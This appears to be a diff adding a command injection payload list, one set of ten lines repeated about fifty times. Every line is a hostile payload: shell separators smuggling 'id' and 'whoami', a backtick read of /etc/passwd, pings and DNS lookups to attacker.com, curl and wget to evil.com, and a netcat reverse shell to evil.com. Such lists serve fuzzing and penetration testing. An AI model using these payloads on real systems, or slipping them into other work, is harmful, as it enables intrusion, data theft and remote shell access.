@@ -1,0 +1,500 @@
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
+;id
+&& whoami
+| ls -la
+`cat /etc/passwd`
+$(whoami)
+|| ping -c 1 attacker.com
+&& curl http://evil.com
+| nc -e /bin/sh evil.com 1234
+& nslookup attacker.com
+|| wget http://evil.com
